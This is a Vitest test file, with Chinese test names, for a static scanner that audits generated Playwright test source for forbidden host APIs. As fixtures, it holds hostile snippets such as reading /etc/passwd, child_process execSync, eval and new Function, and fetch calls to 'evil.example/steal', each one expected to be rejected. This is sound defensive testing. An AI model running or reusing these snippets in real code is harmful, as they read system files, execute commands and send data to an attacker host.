import { describe, expect, test } from 'vitest'
import { auditTrustedRegressionSourceSet } from '../src/index.js'

describe('可信生成源码静态安全扫描', () => {
  test('拒绝宿主文件 API、动态执行和非白名单环境变量', () => {
    const result = auditTrustedRegressionSourceSet([{
      relativePath: 'regression/tests/generated.spec.ts',
      bytes: Buffer.from("import fs from 'node:fs'; eval(process.env.HOME ?? '');"),
    }], 'trusted-read-only')
    expect(result.valid).toBe(false)
    expect(result.findings.map((finding) => finding.code)).toEqual(expect.arrayContaining([
      'E2E_COMPILER_SOURCE_IMPORT_FORBIDDEN',
      'E2E_COMPILER_SOURCE_API_FORBIDDEN',
      'E2E_COMPILER_SOURCE_ENV_FORBIDDEN',
    ]))
  })

  test('文件含合法 Bridge guard 时仍拒绝第二个任意 fetch 调用', () => {
    const source = `
      const url = new URL(process.env.BIZTEST_CONTROLLED_WRITE_BRIDGE!)
      if (url.protocol !== 'http:' || url.hostname !== '127.0.0.1' || url.pathname !== '/v1/reversible-write') throw new Error()
      await fetch(url, { method: 'POST' })
      await fetch('https://evil.example/steal')
    `
    const result = auditTrustedRegressionSourceSet([{
      relativePath: 'regression/fixtures/safe-page.ts', bytes: Buffer.from(source),
    }], 'trusted-reversible-write')
    expect(result.findings).toContainEqual(expect.objectContaining({
      code: 'E2E_COMPILER_SOURCE_NETWORK_FORBIDDEN', detail: 'fetch',
    }))
  })

  test('guard 文本只出现在注释中时不能放行 fetch', () => {
    const source = `
      // const url = new URL(endpoint)
      // if (url.protocol !== 'http:' || url.hostname !== '127.0.0.1' || url.pathname !== '/v1/reversible-write') {
      //   throw new Error('BIZTEST_CONTROLLED_WRITE_BRIDGE_INVALID')
      // }
      const response = await fetch(url, { method: 'POST' })
    `
    const result = auditTrustedRegressionSourceSet([{
      relativePath: 'regression/fixtures/safe-page.ts', bytes: Buffer.from(source),
    }], 'trusted-reversible-write')
    expect(result.findings).toContainEqual(expect.objectContaining({
      code: 'E2E_COMPILER_SOURCE_NETWORK_FORBIDDEN', detail: 'fetch',
    }))
  })

  test('full-playwright profile 允许 Playwright evaluate/addInitScript/request API', () => {
    const source = `
      import { test, expect } from '@playwright/test'
      test('full', async ({ page, context, request }) => {
        await page.evaluate(() => document.body.dataset.ready = 'true')
        await context.addInitScript(() => window.localStorage.setItem('ready', 'true'))
        await request.post('https://example.test/todos', { data: { title: 'todo' } })
        await expect(page.locator('body')).toBeVisible()
      })
    `
    expect(auditTrustedRegressionSourceSet([{
      relativePath: 'regression/tests/generated.spec.ts', bytes: Buffer.from(source),
    }], 'full-playwright')).toEqual({ valid: true, findings: [] })
  })

  test.each([
    ["import fs from 'node:fs'; await fs.readFile('/etc/passwd')", 'E2E_COMPILER_SOURCE_IMPORT_FORBIDDEN'],
    ['process.env.HOME', 'E2E_COMPILER_SOURCE_API_FORBIDDEN'],
    ["await import('arbitrary-tool')", 'E2E_COMPILER_SOURCE_API_FORBIDDEN'],
    ["require('child_process').execSync('id')", 'E2E_COMPILER_SOURCE_API_FORBIDDEN'],
    ["eval('page.goto(\\\"https://evil.example\\\")')", 'E2E_COMPILER_SOURCE_API_FORBIDDEN'],
    ["new Function('return process')()", 'E2E_COMPILER_SOURCE_API_FORBIDDEN'],
    ["await fetch('https://evil.example')", 'E2E_COMPILER_SOURCE_NETWORK_FORBIDDEN'],
  ])('full-playwright profile 仍拒绝宿主或动态执行：%s', (source, code) => {
    const result = auditTrustedRegressionSourceSet([{
      relativePath: 'regression/tests/generated.spec.ts', bytes: Buffer.from(source),
    }], 'full-playwright')
    expect(result.findings).toContainEqual(expect.objectContaining({ code }))
  })
})
